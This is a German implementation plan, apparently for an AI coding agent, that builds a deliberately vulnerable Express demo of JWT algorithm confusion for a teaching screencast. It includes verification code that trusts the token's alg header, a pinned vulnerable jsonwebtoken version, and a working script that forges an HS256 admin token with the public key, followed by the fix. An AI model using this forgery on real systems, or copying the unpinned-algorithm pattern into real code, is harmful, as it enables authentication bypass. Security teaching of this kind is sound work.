# OWASP A07:2025 — JWT Algorithm Confusion Demo — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ein lauffähiges Demo-Projekt für einen 8–10-minütigen Screencast über OWASP A07:2025, das einen JWT-Algorithm-Confusion-Angriff (RS256→HS256) live vorführt und behebt.

**Architecture:** Ein Node.js/Express-Server stellt RS256-JWTs aus und schützt eine Admin-Route. Die zentrale Verifikationsfunktion in `src/auth.js` hat einen `VULNERABLE`-Schalter: verwundbar liest sie den Algorithmus aus dem (angreifer-kontrollierten) Token-Header, gepinnt erzwingt sie `RS256`. Ein Node-Exploit-Skript fälscht ein HS256-Admin-Token mit dem öffentlichen Schlüssel als HMAC-Secret. `demo.sh` orchestriert beide Phasen ohne Tippen.

**Tech Stack:** Node.js ≥ 18 (Zielumgebung Node 25), Express 4, `jsonwebtoken@8.5.1` (exakt — Version mit offener CVE-2022-23541), Bash.

**Verifikationsansatz:** Gemäss freigegebener Spec (`docs/specs/2026-05-22-owasp-a07-jwt-algorithm-confusion-design.md`, §11) gibt es **kein Test-Framework**. Jede Task wird mit einem konkreten, ausführbaren Befehl und erwarteter Ausgabe verifiziert; der Exploit gegen beide Modi und der Selbstcheck in `demo.sh` sind der End-zu-End-Nachweis. Die Verifikationsbefehle sind Wegwerf-Einzeiler und werden **nicht** Teil des Repos.

**Hinweis zu Commits:** Jede Task endet mit einem Commit-Schritt. Ob committet wird, klärt der Ausführungs-Handoff mit dem Benutzer (Regel: nur committen, wenn gewünscht). Commit-Nachrichten im Conventional-Commits-Format, ohne Attribution.

---

## Dateistruktur

| Datei | Verantwortung |
|---|---|
| `package.json` | Metadaten, Scripts, Dependencies (`jsonwebtoken` exakt 8.5.1) |
| `.gitignore` | schliesst `node_modules/` und `*.pem` aus |
| `src/keys.js` | RSA-Schlüsselpaar erzeugen, `public.pem` schreiben |
| `src/users.js` | In-Memory-Benutzerspeicher (ein Normaluser, kein Admin) |
| `src/auth.js` | `issueToken()` + `verifyToken()` mit `VULNERABLE`-Schalter — Kern |
| `src/server.js` | Express-App: `POST /login`, `GET /admin`, `GET /public-key` |
| `exploit/exploit.js` | der Angriff in 6 nummerierten Schritten |
| `demo.sh` | orchestriert beide Phasen, Selbstcheck |
| `README.md` | Setup + Sprecher-Skript + Zeitbudget |

---

## Task 1: Projekt-Grundgerüst

**Files:**
- Create: `package.json`
- Create: `.gitignore`
- Verifikation: `npm ls jsonwebtoken`

- [ ] **Step 1: `package.json` anlegen**

```json
{
  "name": "owasp-a07-jwt-algorithm-confusion",
  "version": "1.0.0",
  "private": true,
  "description": "OWASP A07:2025 — Demo: JWT Algorithm Confusion (RS256 -> HS256)",
  "scripts": {
    "start": "node src/server.js",
    "exploit": "node exploit/exploit.js",
    "demo": "./demo.sh"
  },
  "dependencies": {
    "express": "^4.21.2",
    "jsonwebtoken": "8.5.1"
  },
  "engines": {
    "node": ">=18"
  }
}
```

- [ ] **Step 2: `.gitignore` anlegen**

```gitignore
node_modules/
*.pem
npm-debug.log*
.DS_Store
```

- [ ] **Step 3: Dependencies installieren**

Run: `npm install`
Expected: Es entstehen `node_modules/` und `package-lock.json`. `npm audit` meldet bekannte Schwachstellen für `jsonwebtoken@8.5.1` — das ist gewollt.

- [ ] **Step 4: Version verifizieren**

Run: `npm ls jsonwebtoken`
Expected: Zeigt exakt `jsonwebtoken@8.5.1` (nicht 9.x).

- [ ] **Step 5: Commit**

```bash
git add package.json package-lock.json .gitignore docs
git commit -m "chore: Projekt-Grundgeruest, Dependencies und Design-Dokumente"
```

---

## Task 2: RSA-Schlüsselverwaltung (`src/keys.js`)

**Files:**
- Create: `src/keys.js`
- Verifikation: `node -e "..."`

- [ ] **Step 1: Verifikation vorbereiten (muss zunächst fehlschlagen)**

Run:
```bash
node -e "const k=require('./src/keys'); const {publicKey}=k.generateKeyPair(); k.writePublicKeyFile(publicKey); console.log(publicKey.slice(0,27)); console.log('Datei da:', require('fs').existsSync(k.PUBLIC_KEY_PATH));"
```
Expected: FAIL mit `Cannot find module './src/keys'`.

- [ ] **Step 2: `src/keys.js` implementieren**

```js
'use strict';

// Erzeugt das RSA-Schlüsselpaar für den Demo-Server und legt den
// öffentlichen Schlüssel als Datei ab. Der private Schlüssel bleibt
// ausschliesslich im Arbeitsspeicher des Server-Prozesses.

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// public.pem liegt im Projekt-Root (eine Ebene über src/).
const PUBLIC_KEY_PATH = path.join(__dirname, '..', 'public.pem');

// Erzeugt ein frisches RSA-2048-Schlüsselpaar im PEM-Format.
function generateKeyPair() {
  return crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
  });
}

// Schreibt den öffentlichen Schlüssel nach public.pem.
// Das ist Absicht: Der öffentliche Schlüssel ist kein Geheimnis.
function writePublicKeyFile(publicKey) {
  fs.writeFileSync(PUBLIC_KEY_PATH, publicKey, 'utf8');
  return PUBLIC_KEY_PATH;
}

module.exports = { generateKeyPair, writePublicKeyFile, PUBLIC_KEY_PATH };
```

- [ ] **Step 3: Verifikation ausführen**

Run:
```bash
node -e "const k=require('./src/keys'); const {publicKey}=k.generateKeyPair(); k.writePublicKeyFile(publicKey); console.log(publicKey.slice(0,27)); console.log('Datei da:', require('fs').existsSync(k.PUBLIC_KEY_PATH));"
```
Expected:
```
-----BEGIN PUBLIC KEY-----
Datei da: true
```

- [ ] **Step 4: Commit**

```bash
git add src/keys.js
git commit -m "feat: RSA-Schluesselverwaltung mit keys.js"
```

---

## Task 3: Benutzerspeicher (`src/users.js`)

**Files:**
- Create: `src/users.js`
- Verifikation: `node -e "..."`

- [ ] **Step 1: Verifikation vorbereiten (muss zunächst fehlschlagen)**

Run:
```bash
node -e "const {findUser}=require('./src/users'); console.log(JSON.stringify(findUser('alice','passwort123'))); console.log(JSON.stringify(findUser('alice','falsch'))); console.log(JSON.stringify(findUser('mallory','x')));"
```
Expected: FAIL mit `Cannot find module './src/users'`.

- [ ] **Step 2: `src/users.js` implementieren**

```js
'use strict';

// Winziger In-Memory-Benutzerspeicher für die Demo.
// Bewusst nur ein Normalbenutzer und KEIN Admin-Konto: Der Angriff
// verschafft Admin-Rechte, obwohl es gar kein Admin-Passwort gibt.

// Hinweis: Klartext-Passwort nur zu Demozwecken. Produktiv gehörte hier
// ein Passwort-Hash (bcrypt/argon2) hin — das ist aber nicht das Thema
// dieser A07-Demo.
const USERS = Object.freeze([
  Object.freeze({ username: 'alice', password: 'passwort123', role: 'user' }),
]);

// Sucht einen Benutzer anhand von Benutzername und Passwort.
// Gibt das Benutzerobjekt zurück oder null bei falschen Anmeldedaten.
function findUser(username, password) {
  const user = USERS.find((u) => u.username === username);
  if (!user || user.password !== password) {
    return null;
  }
  return user;
}

module.exports = { findUser };
```

- [ ] **Step 3: Verifikation ausführen**

Run:
```bash
node -e "const {findUser}=require('./src/users'); console.log(JSON.stringify(findUser('alice','passwort123'))); console.log(JSON.stringify(findUser('alice','falsch'))); console.log(JSON.stringify(findUser('mallory','x')));"
```
Expected:
```
{"username":"alice","password":"passwort123","role":"user"}
null
null
```

- [ ] **Step 4: Commit**

```bash
git add src/users.js
git commit -m "feat: In-Memory-Benutzerspeicher mit users.js"
```

---

## Task 4: JWT-Logik mit `VULNERABLE`-Schalter (`src/auth.js`)

**Files:**
- Create: `src/auth.js`
- Verifikation: `node -e "..."`

- [ ] **Step 1: Verifikation vorbereiten (muss zunächst fehlschlagen)**

Run:
```bash
node -e "const {generateKeyPair}=require('./src/keys'); const {issueToken,verifyToken,VULNERABLE}=require('./src/auth'); const {publicKey,privateKey}=generateKeyPair(); const t=issueToken({username:'alice',role:'user'},privateKey); console.log('VULNERABLE=',VULNERABLE); console.log('role=',verifyToken(t,publicKey).role);"
```
Expected: FAIL mit `Cannot find module './src/auth'`.

- [ ] **Step 2: `src/auth.js` implementieren**

```js
'use strict';

// ════════════════════════════════════════════════════════════════════
//  KERN DER DEMO — JWT-Ausstellung und -Verifikation
// ════════════════════════════════════════════════════════════════════

const jwt = require('jsonwebtoken');

// --------------------------------------------------------------------
//  VULNERABLE-Schalter
//    true  = verwundbar: der erlaubte Algorithmus wird aus dem
//            (angreifer-kontrollierten!) Token-Header gelesen.
//    false = gepinnt:    der Algorithmus ist serverseitig fest RS256.
//  Per Umgebungsvariable steuerbar:  VULNERABLE=false node src/server.js
// --------------------------------------------------------------------
const VULNERABLE = process.env.VULNERABLE !== 'false';

// Stellt ein JWT für einen Benutzer aus — immer mit RS256, signiert
// mit dem privaten Schlüssel. Das ist das korrekte Verhalten.
function issueToken(user, privateKey) {
  return jwt.sign(
    { sub: user.username, role: user.role },
    privateKey,
    { algorithm: 'RS256', expiresIn: '15m' }
  );
}

// Verifiziert ein JWT.
function verifyToken(token, publicKey) {
  if (VULNERABLE) {
    // ⚠ SCHWACHSTELLE: Der Header eines JWT ist nicht signiert und
    // stammt vollständig vom Aufrufer. Hier wird der darin angegebene
    // Algorithmus blind übernommen. Ein Angreifer setzt alg=HS256 —
    // dann verwendet jsonwebtoken den ÖFFENTLICHEN Schlüssel als
    // HMAC-Secret und akzeptiert eine selbst signierte Fälschung.
    const decoded = jwt.decode(token, { complete: true });
    const alg = decoded && decoded.header && decoded.header.alg;
    return jwt.verify(token, publicKey, { algorithms: [alg] });
  }

  // ✓ FIX: Der Algorithmus wird serverseitig fest vorgegeben. Das
  // alg-Feld aus dem Header wird ignoriert. Ein HS256-Token fliegt
  // mit "invalid algorithm" raus.
  return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
}

module.exports = { issueToken, verifyToken, VULNERABLE };
```

- [ ] **Step 3: Verifikation ausführen**

Run:
```bash
node -e "const {generateKeyPair}=require('./src/keys'); const {issueToken,verifyToken,VULNERABLE}=require('./src/auth'); const {publicKey,privateKey}=generateKeyPair(); const t=issueToken({username:'alice',role:'user'},privateKey); console.log('VULNERABLE=',VULNERABLE); console.log('role=',verifyToken(t,publicKey).role);"
```
Expected:
```
VULNERABLE= true
role= user
```

- [ ] **Step 4: Commit**

```bash
git add src/auth.js
git commit -m "feat: JWT-Ausstellung und -Verifikation mit VULNERABLE-Schalter"
```

---

## Task 5: Express-Server (`src/server.js`)

**Files:**
- Create: `src/server.js`
- Verifikation: Server starten + Routen prüfen

- [ ] **Step 1: `src/server.js` implementieren**

```js
'use strict';

// Demo-Server für die OWASP-A07-Schwachstelle.
// ACHTUNG: absichtlich verwundbar — nur lokal verwenden, nicht deployen.

const express = require('express');
const jwt = require('jsonwebtoken');
const { generateKeyPair, writePublicKeyFile, PUBLIC_KEY_PATH } = require('./keys');
const { findUser } = require('./users');
const { issueToken, verifyToken, VULNERABLE } = require('./auth');

const PORT = process.env.PORT || 3000;

// Beim Start ein frisches Schlüsselpaar erzeugen.
// Der private Schlüssel bleibt nur hier im Speicher.
const { publicKey, privateKey } = generateKeyPair();
writePublicKeyFile(publicKey);

const app = express();
app.use(express.json());

// --- POST /login -----------------------------------------------------
// Prüft die Anmeldedaten und stellt ein RS256-JWT aus.
app.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'username und password erforderlich' });
  }
  const user = findUser(username, password);
  if (!user) {
    return res.status(401).json({ error: 'Ungültige Anmeldedaten' });
  }
  return res.json({ token: issueToken(user, privateKey) });
});

// --- GET /admin ------------------------------------------------------
// Geschützte Route. Erwartet einen gültigen Token mit role=admin.
app.get('/admin', (req, res) => {
  const authHeader = req.headers.authorization || '';
  const match = authHeader.match(/^Bearer (.+)$/);
  if (!match) {
    return res.status(401).json({ error: 'Kein Bearer-Token im Authorization-Header' });
  }
  const token = match[1];

  // Nur fürs Server-Log: welchen Algorithmus behauptet das Token?
  const presented = jwt.decode(token, { complete: true });
  const presentedAlg = (presented && presented.header && presented.header.alg) || '?';

  let payload;
  try {
    payload = verifyToken(token, publicKey);
  } catch (err) {
    console.log(`[/admin] alg=${presentedAlg} -> abgelehnt: ${err.message}`);
    return res.status(401).json({ error: 'Token ungültig: ' + err.message });
  }

  console.log(`[/admin] alg=${presentedAlg} -> akzeptiert (sub=${payload.sub}, role=${payload.role})`);

  if (payload.role !== 'admin') {
    return res.status(403).json({ error: 'Adminrechte erforderlich' });
  }

  return res.json({
    message: `Willkommen im Admin-Bereich, ${payload.sub}.`,
    geheim: 'INTERNE DATEN: Gehaltsliste Q2, Master-API-Keys, Notfallpläne',
  });
});

// --- GET /public-key -------------------------------------------------
// Liefert den öffentlichen Schlüssel. Er ist kein Geheimnis.
app.get('/public-key', (req, res) => {
  res.type('text/plain').send(publicKey);
});

app.listen(PORT, () => {
  const modus = VULNERABLE
    ? '⚠  VERWUNDBAR  (Algorithmus aus dem Token-Header)'
    : '✓  GEPINNT     (algorithms: [\'RS256\'])';
  console.log('='.repeat(64));
  console.log('  OWASP A07:2025 — Demo-Server');
  console.log(`  Modus:       ${modus}`);
  console.log(`  Port:        ${PORT}`);
  console.log(`  Public Key:  ${PUBLIC_KEY_PATH}`);
  console.log('='.repeat(64));
});
```

- [ ] **Step 2: Server starten und Routen verifizieren**

Run:
```bash
node src/server.js & SERVER_PID=$!
sleep 1
node -e '(async()=>{const b="http://localhost:3000"; const pk=await (await fetch(b+"/public-key")).text(); console.log("public-key:", pk.split("\n")[0]); const lr=await fetch(b+"/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"alice",password:"passwort123"})}); const {token}=await lr.json(); console.log("login:", token? "Token erhalten":"FEHLER"); console.log("admin ohne Token:", (await fetch(b+"/admin")).status); console.log("admin als user:", (await fetch(b+"/admin",{headers:{Authorization:"Bearer "+token}})).status);})();'
kill $SERVER_PID
```
Expected:
```
public-key: -----BEGIN PUBLIC KEY-----
login: Token erhalten
admin ohne Token: 401
admin als user: 403
```

- [ ] **Step 3: Commit**

```bash
git add src/server.js
git commit -m "feat: Express-Server mit Login-, Admin- und Public-Key-Route"
```

---

## Task 6: Exploit-Skript (`exploit/exploit.js`)

**Files:**
- Create: `exploit/exploit.js`
- Verifikation: Exploit gegen verwundbaren und gepinnten Server

- [ ] **Step 1: `exploit/exploit.js` implementieren**

```js
'use strict';

// ════════════════════════════════════════════════════════════════════
//  EXPLOIT — JWT Algorithm Confusion (RS256 -> HS256)
//  Führt den Angriff gegen den Demo-Server in 6 Schritten vor.
// ════════════════════════════════════════════════════════════════════

const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const PORT = process.env.PORT || 3000;
const BASE_URL = `http://localhost:${PORT}`;
const STEP_DELAY_MS = Number(process.env.STEP_DELAY_MS || 1200);
const PUBLIC_KEY_PATH = path.join(__dirname, '..', 'public.pem');

// --- kleine Ausgabe-Helfer (ANSI-Farben, keine Abhängigkeiten) -------
const C = {
  reset: '\x1b[0m', bold: '\x1b[1m', dim: '\x1b[2m',
  red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', cyan: '\x1b[36m',
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function step(n, title) {
  console.log(`\n${C.bold}${C.cyan}-- Schritt ${n}: ${title} --${C.reset}`);
}
function info(msg) { console.log(`   ${msg}`); }
function good(msg) { console.log(`   ${C.green}${msg}${C.reset}`); }
function bad(msg) { console.log(`   ${C.red}${msg}${C.reset}`); }

// Zerlegt ein JWT und gibt Header + Payload lesbar aus.
function showToken(token) {
  const decoded = jwt.decode(token, { complete: true });
  info(`${C.dim}Header :${C.reset} ${JSON.stringify(decoded.header)}`);
  info(`${C.dim}Payload:${C.reset} ${JSON.stringify(decoded.payload)}`);
}

async function main() {
  console.log(`${C.bold}OWASP A07:2025 — JWT Algorithm Confusion — Exploit${C.reset}`);
  console.log(`${C.dim}Ziel: ${BASE_URL}${C.reset}`);

  // --- Schritt 1: Normaler Login -------------------------------------
  step(1, 'Normaler Login als regulärer Benutzer');
  const loginRes = await fetch(`${BASE_URL}/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'alice', password: 'passwort123' }),
  });
  const loginBody = await loginRes.json();
  if (!loginRes.ok || !loginBody.token) {
    throw new Error(`Login fehlgeschlagen (HTTP ${loginRes.status})`);
  }
  const realToken = loginBody.token;
  good('Login erfolgreich — der Server hat ein echtes Token ausgestellt:');
  showToken(realToken);
  info('-> Sauber mit RS256 signiert (privater Schlüssel des Servers), role=user.');
  await sleep(STEP_DELAY_MS);

  // --- Schritt 2: Legitimer Admin-Zugriff scheitert ------------------
  step(2, 'Mit dem echten Token auf /admin zugreifen');
  const denyRes = await fetch(`${BASE_URL}/admin`, {
    headers: { Authorization: `Bearer ${realToken}` },
  });
  bad(`Antwort: HTTP ${denyRes.status} — ${JSON.stringify(await denyRes.json())}`);
  info('-> Korrekt abgewiesen: alice ist kein Admin.');
  await sleep(STEP_DELAY_MS);

  // --- Schritt 3: Öffentlichen Schlüssel besorgen --------------------
  step(3, 'Den öffentlichen Schlüssel besorgen');
  const publicKey = fs.readFileSync(PUBLIC_KEY_PATH, 'utf8');
  info('Der Server legt seinen öffentlichen Schlüssel offen ab (public.pem,');
  info(`auch unter ${BASE_URL}/public-key). Das ist kein Leak — er ist öffentlich:`);
  console.log(`${C.dim}${publicKey.trim()}${C.reset}`);
  await sleep(STEP_DELAY_MS);

  // --- Schritt 4: Admin-Token fälschen -------------------------------
  step(4, 'Ein Admin-Token fälschen (HS256, signiert mit dem Public Key)');
  const forgedToken = jwt.sign(
    { sub: 'mallory', role: 'admin' },
    publicKey,                       // <- der OEFFENTLICHE Schlüssel als HMAC-Secret
    { algorithm: 'HS256' }
  );
  good('Gefälschtes Token erzeugt:');
  showToken(forgedToken);
  info(`${C.yellow}-> alg=HS256, role=admin — signiert per HMAC mit dem öffentlichen Schlüssel.${C.reset}`);
  await sleep(STEP_DELAY_MS);

  // --- Schritt 5: Angriff --------------------------------------------
  step(5, 'Mit dem gefälschten Token auf /admin zugreifen');
  const attackRes = await fetch(`${BASE_URL}/admin`, {
    headers: { Authorization: `Bearer ${forgedToken}` },
  });
  const attackBody = await attackRes.json();
  info(`Antwort: HTTP ${attackRes.status}`);
  await sleep(STEP_DELAY_MS);

  // --- Schritt 6: Ergebnis -------------------------------------------
  step(6, 'Ergebnis');
  if (attackRes.status === 200) {
    bad('ANGRIFF ERFOLGREICH — Admin-Zugriff ohne Passwort, ohne privaten Schlüssel.');
    info(`${C.red}${JSON.stringify(attackBody, null, 2)}${C.reset}`);
    console.log(`\n${C.bold}${C.red}ERGEBNIS: ANGRIFF ERFOLGREICH${C.reset}`);
  } else {
    good(`Angriff abgewehrt — der Server hat das Token mit HTTP ${attackRes.status} verworfen.`);
    info(`${C.dim}${JSON.stringify(attackBody)}${C.reset}`);
    info('-> Der Server pinnt den Algorithmus auf RS256 und ignoriert den Header.');
    console.log(`\n${C.bold}${C.green}ERGEBNIS: ANGRIFF ABGEWEHRT${C.reset}`);
  }
}

main().catch((err) => {
  const code = err && err.cause && err.cause.code;
  if (code === 'ECONNREFUSED' || /fetch failed/i.test(err.message || '')) {
    console.error(`\n${C.red}Server nicht erreichbar unter ${BASE_URL}.${C.reset}`);
    console.error('Läuft der Server? Start:  node src/server.js');
  } else {
    console.error(`\n${C.red}Unerwarteter Fehler:${C.reset} ${err.message}`);
  }
  process.exit(1);
});
```

- [ ] **Step 2: Exploit gegen den VERWUNDBAREN Server**

Run:
```bash
VULNERABLE=true node src/server.js > /tmp/a07-check-server.log 2>&1 & SERVER_PID=$!
sleep 1
STEP_DELAY_MS=0 node exploit/exploit.js
kill $SERVER_PID
```
Expected: Sechs Schritte werden ausgegeben; Schritt 2 zeigt `HTTP 403`; Schritt 6 zeigt `HTTP 200` und endet mit `ERGEBNIS: ANGRIFF ERFOLGREICH`.

- [ ] **Step 3: Exploit gegen den GEPINNTEN Server**

Run:
```bash
VULNERABLE=false node src/server.js > /tmp/a07-check-server.log 2>&1 & SERVER_PID=$!
sleep 1
STEP_DELAY_MS=0 node exploit/exploit.js
kill $SERVER_PID
```
Expected: Schritt 5 zeigt `HTTP 401`; die Ausgabe endet mit `ERGEBNIS: ANGRIFF ABGEWEHRT`.

- [ ] **Step 4: Commit**

```bash
git add exploit/exploit.js
git commit -m "feat: Exploit-Skript fuer JWT Algorithm Confusion"
```

---

## Task 7: Orchestrierung (`demo.sh`)

**Files:**
- Create: `demo.sh`
- Verifikation: `./demo.sh`

- [ ] **Step 1: `demo.sh` implementieren**

```bash
#!/usr/bin/env bash
# ════════════════════════════════════════════════════════════════════
#  demo.sh — orchestriert die Aufnahme des A07-Screencasts.
#  Startet Server und Exploit in der richtigen Reihenfolge.
#
#  Verwendung:
#    ./demo.sh         beide Phasen (verwundbar, dann gepinnt)
#    ./demo.sh vuln    nur Phase 1 (verwundbar)
#    ./demo.sh fixed   nur Phase 2 (Fix)
# ════════════════════════════════════════════════════════════════════
set -euo pipefail

# Immer aus dem Projektverzeichnis arbeiten.
cd "$(dirname "$0")"

PORT="${PORT:-3000}"
export NODE_NO_WARNINGS=1

if [ ! -d node_modules ]; then
  echo "node_modules fehlt. Bitte zuerst ausführen:  npm install" >&2
  exit 1
fi

SERVER_PID=""
LAST_CHECK=""

cleanup() {
  if [ -n "${SERVER_PID}" ] && kill -0 "${SERVER_PID}" 2>/dev/null; then
    kill "${SERVER_PID}" 2>/dev/null || true
    wait "${SERVER_PID}" 2>/dev/null || true
  fi
  SERVER_PID=""
}
trap cleanup EXIT

wait_ready() {
  local i
  for i in $(seq 1 50); do
    if curl -s -o /dev/null "http://localhost:${PORT}/public-key"; then
      return 0
    fi
    sleep 0.2
  done
  echo "FEHLER: Server wurde nicht rechtzeitig bereit." >&2
  exit 1
}

# run_phase <VULNERABLE-Wert> <Banner> <erwartet: ERFOLGREICH|ABGEWEHRT>
run_phase() {
  local mode="$1" label="$2" expect="$3"
  local logfile="/tmp/a07-demo-server-${mode}.log"
  local outfile="/tmp/a07-demo-exploit-${mode}.out"

  printf '\n================================================================\n'
  printf '  %s\n' "$label"
  printf '================================================================\n'

  VULNERABLE="$mode" node src/server.js >"$logfile" 2>&1 &
  SERVER_PID=$!
  wait_ready

  node exploit/exploit.js | tee "$outfile" || true
  cleanup

  printf '\n  (Server-Log: %s)\n' "$logfile"

  if grep -q "ERGEBNIS: ANGRIFF ${expect}" "$outfile"; then
    LAST_CHECK="PASS"
  else
    LAST_CHECK="FAIL"
  fi
}

PHASE="${1:-both}"
case "$PHASE" in
  both|vuln|fixed) ;;
  *) echo "Unbekanntes Argument: $PHASE  (erlaubt: vuln | fixed | <leer>)" >&2; exit 1 ;;
esac

SUMMARY=""

if [ "$PHASE" = both ] || [ "$PHASE" = vuln ]; then
  run_phase true 'PHASE 1 — Server VERWUNDBAR (der Angriff muss gelingen)' ERFOLGREICH
  SUMMARY="${SUMMARY}  Phase 1 (verwundbar):  ${LAST_CHECK}  — erwartet: Angriff erfolgreich\n"
fi

if [ "$PHASE" = both ] || [ "$PHASE" = fixed ]; then
  run_phase false 'PHASE 2 — Server GEPINNT / FIX (der Angriff muss scheitern)' ABGEWEHRT
  SUMMARY="${SUMMARY}  Phase 2 (gepinnt):     ${LAST_CHECK}  — erwartet: Angriff abgewehrt\n"
fi

printf '\n================================================================\n'
printf '  SELBSTCHECK\n'
printf '================================================================\n'
printf '%b' "$SUMMARY"
printf '\n'
```

- [ ] **Step 2: Skript ausführbar machen**

Run: `chmod +x demo.sh`
Expected: kein Output, Exit-Code 0.

- [ ] **Step 3: Vollständigen Durchlauf verifizieren**

Run: `./demo.sh`
Expected: Beide Phasen laufen; der Selbstcheck am Ende meldet:
```
  Phase 1 (verwundbar):  PASS  — erwartet: Angriff erfolgreich
  Phase 2 (gepinnt):     PASS  — erwartet: Angriff abgewehrt
```

- [ ] **Step 4: Commit**

```bash
git add demo.sh
git commit -m "feat: demo.sh zur Orchestrierung der Aufnahme"
```

---

## Task 8: README mit Sprecher-Skript (`README.md`)

**Files:**
- Create: `README.md`
- Verifikation: Sichtprüfung + `grep`

- [ ] **Step 1: `README.md` implementieren**

````markdown
# OWASP A07:2025 — JWT Algorithm Confusion (Demo)

Begleitprojekt zu einem Screencast über **OWASP Top 10 — A07:2025 Authentication
Failures**. Es demonstriert einen **JWT-Algorithm-Confusion-Angriff** (RS256 → HS256)
und die Gegenmassnahme — vollständig im Terminal, ohne Browser.

## ⚠️ Sicherheitshinweis

Dieses Projekt ist **absichtlich verwundbar**. Es nutzt `jsonwebtoken@8.5.1`
(CVE-2022-23541) und verzichtet bewusst auf Schutzmassnahmen.

- Nur **lokal** verwenden, **niemals deployen**.
- `npm install` / `npm audit` melden bekannte Sicherheitslücken — **das ist
  gewollt** und Teil des Lerninhalts.

## Voraussetzungen

- Node.js ≥ 18 (getestet mit Node 25)
- npm

## Setup

```bash
npm install
```

Installiert `express` und exakt `jsonwebtoken@8.5.1`.

## Schnellstart

```bash
./demo.sh
```

Führt beide Phasen vor: zuerst den verwundbaren Server (Angriff gelingt), dann
den gepinnten Server (Angriff scheitert), abschliessend einen Selbstcheck.

Für die Aufnahme abschnittsweise:

```bash
./demo.sh vuln     # nur Phase 1 — verwundbar
./demo.sh fixed    # nur Phase 2 — Fix
```

## Manueller Betrieb

```bash
# Verwundbarer Server (Standard)
node src/server.js

# Gepinnter Server (Fix aktiv)
VULNERABLE=false node src/server.js

# Exploit (zweites Terminal, Server muss laufen)
node exploit/exploit.js
```

## Hintergrund

| | |
|---|---|
| OWASP | A07:2025 — Authentication Failures |
| CWE (primär) | CWE-303 — Incorrect Implementation of Authentication Algorithm |
| CWE (Oberbegriff) | CWE-287 — Improper Authentication |
| Quelle | https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/ |

## Die Schwachstelle in einer Zeile

In `src/auth.js`:

```js
// VERWUNDBAR — Algorithmus aus dem (angreifer-kontrollierten) Header:
return jwt.verify(token, publicKey, { algorithms: [alg] });

// FIX — Algorithmus serverseitig fest gepinnt:
return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

## 🎬 Drehbuch / Sprecher-Skript

Gesamtlänge ca. 9:00 Minuten. Der **Sprechertext** (Zitatblöcke) ist wörtlich
vorlesbar. **[Regie: …]** beschreibt, was am Bildschirm zu sehen ist.

### 0:00 – 1:00 · Intro

**[Regie:** Titelbild oder leeres Terminal mit Projektnamen. Voice-over.**]**

> Willkommen zu dieser Demo aus dem Modul Applikationssicherheit. Wir schauen
> uns heute Platz sieben der OWASP Top Ten an — in der Ausgabe 2025 heisst diese
> Kategorie „Authentication Failures", also Fehler bei der Authentifizierung.
>
> Konkret zeige ich euch eine Schwachstelle, die in der Praxis erstaunlich oft
> vorkommt: die sogenannte JWT Algorithm Confusion. Ein Angreifer bringt einen
> Server dazu, ein selbst gefälschtes Token zu akzeptieren — und verschafft sich
> damit Administrator-Rechte. Ganz ohne Passwort und ohne den geheimen Schlüssel
> des Servers.
>
> Der Plan: Zuerst klären wir kurz die Theorie. Dann führe ich den Angriff live
> gegen einen verwundbaren Server vor. Anschliessend behebe ich die Lücke — es
> ist nur eine einzige Zeile Code — und zeige, dass derselbe Angriff danach ins
> Leere läuft. Los geht's.

### 1:00 – 2:30 · Theorie

**[Regie:** Einfaches Schema eines JWT: drei Teile `Header.Payload.Signatur`.**]**

> Kurz zur Grundlage. Ein JSON Web Token, kurz JWT, besteht aus drei Teilen:
> einem Header, einer Payload mit den Nutzdaten, und einer Signatur. Der Header
> sagt unter anderem, mit welchem Algorithmus das Token signiert wurde — im Feld
> „alg".
>
> Für die Signatur gibt es zwei wichtige Familien. RS256 ist asymmetrisch: Der
> Server signiert mit einem privaten Schlüssel, und jeder kann mit dem
> dazugehörigen öffentlichen Schlüssel prüfen, ob die Signatur stimmt. Der
> öffentliche Schlüssel ist dabei kein Geheimnis — er darf öffentlich sein, das
> steckt schon im Namen.
>
> HS256 dagegen ist symmetrisch: Hier signiert und prüft man mit demselben
> geheimen Schlüssel — einem HMAC.
>
> Und jetzt der Knackpunkt. Was passiert, wenn der Server beim Prüfen blind dem
> „alg"-Feld aus dem Header vertraut? Der Header ist nicht signiert — ein
> Angreifer kann ihn frei setzen. Er stellt das Token auf HS256 um. Der Server
> nimmt nun den einzigen Schlüssel, den er hat — den öffentlichen RSA-Schlüssel
> — und behandelt ihn als HMAC-Geheimnis. Aber dieser Schlüssel ist öffentlich.
> Der Angreifer kennt ihn also auch und kann damit selbst ein gültiges
> HS256-Token signieren. Aus „nur prüfen können" wird „auch fälschen können".
> Genau das sehen wir jetzt.

### 2:30 – 5:30 · Schwachstelle (Hands-on)

**[Regie:** Editor mit `src/auth.js` offen, Funktion `verifyToken` sichtbar.**]**

> Schauen wir zuerst auf den verwundbaren Code. Das ist die Funktion
> „verifyToken" in der Datei auth.js. Im verwundbaren Zweig sieht man genau den
> Fehler: Der Code liest den Algorithmus aus dem dekodierten Header — diese
> Variable „alg" — und übergibt ihn direkt an die Prüffunktion. Der Server
> akzeptiert also genau den Algorithmus, den das Token behauptet. Und das Token
> kommt vom Angreifer.

**[Regie:** Terminal. `./demo.sh vuln` ausführen.**]**

> Ich starte jetzt die Demo im verwundbaren Modus. Das Skript startet den Server
> und lässt dann automatisch den Exploit laufen — ich muss nichts mehr tippen.

**[Regie:** Server-Banner erscheint („Modus: VERWUNDBAR"), danach läuft der
Exploit Schritt für Schritt.**]**

> Der Server läuft — hier oben steht: Modus verwundbar. Jetzt der Angriff, in
> sechs Schritten.
>
